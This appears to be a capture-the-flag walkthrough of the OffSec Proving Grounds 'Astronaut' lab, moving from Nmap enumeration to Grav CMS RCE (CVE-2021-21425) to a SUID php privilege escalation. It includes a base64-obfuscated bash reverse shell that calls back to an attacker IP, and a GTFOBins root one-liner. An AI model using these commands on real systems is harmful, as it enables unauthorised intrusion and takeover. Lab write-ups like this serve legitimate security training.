---
title: "PG: Astronaut"
date: 2024-02-24
draft: false
os: "Linux"
difficulty: "Easy"
platform: "OffSec Proving Grounds"
aliases: ["/posts/offsec/astronaut/"]
tags:
  - offsec
  - proving-grounds
  - easy
  - linux
  - grav-cms
  - cve-2021-21425
  - rce
  - suid
  - gtfobins
categories:
  - walkthrough
---

{{< box-info name="Astronaut" os="Linux" difficulty="Easy" ip="192.168.155.12" platform="OffSec Proving Grounds" >}}

---

## Enumeration

### Nmap

{{< collapse title="Nmap output" >}}
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```
{{< /collapse >}}

Two ports. SSH is a dead end without creds, so the web server is the way in. The Apache directory listing on port 80 exposes a `grav-admin/` folder — a [Grav CMS](https://getgrav.org/) install. `robots.txt` confirms a stock Grav layout (`/user/`, `/system/`, `/cache/`…).

The version isn't advertised anywhere, so this is a "take the shot" box — assume it's old enough to be vulnerable and go looking for a known CVE.

---

## Foothold

### Grav CMS RCE — CVE-2021-21425

Grav's Admin plugin is vulnerable to an unauthenticated RCE (CVE-2021-21425). The Metasploit module works, but on this box the callback shell dies within seconds — use the standalone PoC instead ([CsEnox/CVE-2021-21425](https://github.com/CsEnox/CVE-2021-21425)).

Start a listener, then trigger the exploit with a base64-encoded bash reverse shell to survive quoting issues:

```bash
python3 astro.py -t http://astronaut.offsec/grav-admin \
  -c 'echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIyNS84MCAwPiYx" | base64 -d | bash'
```

Shell lands as the low-priv web user.

---

## Privilege Escalation

### SUID php7.4 — GTFOBins

OffSec is notoriously hostile to LinPEAS on these boxes, so read the output carefully instead of skimming it. Buried in the SUID scan is a non-standard entry:

![SUID scan flagging /usr/bin/php7.4 as an unknown SUID binary](/images/astronaut/suid-php.png)

`/usr/bin/php7.4` carries the SUID bit. [GTFOBins](https://gtfobins.github.io/gtfobins/php/#suid) has a one-liner for exactly this — spawn a shell that preserves the elevated privileges:

```bash
/usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"
```

Root.

---

## Proof

![Root proof — whoami, hostname, and /root/proof.txt](/images/astronaut/proof.png)

---

## Key Takeaways

{{< callout type="note" >}}
- When a CMS hides its version, don't stall — check known CVEs for the product and take the shot. Grav's Admin plugin (CVE-2021-21425) is a reliable unauth RCE.
- On OffSec boxes, prebuilt Metasploit callbacks often die instantly. Keep a standalone PoC and a manual reverse shell ready.
- Always read the *full* SUID list — a SUID interpreter (`php`, `python`, `perl`) is an instant GTFOBins privilege escalation.
{{< /callout >}}
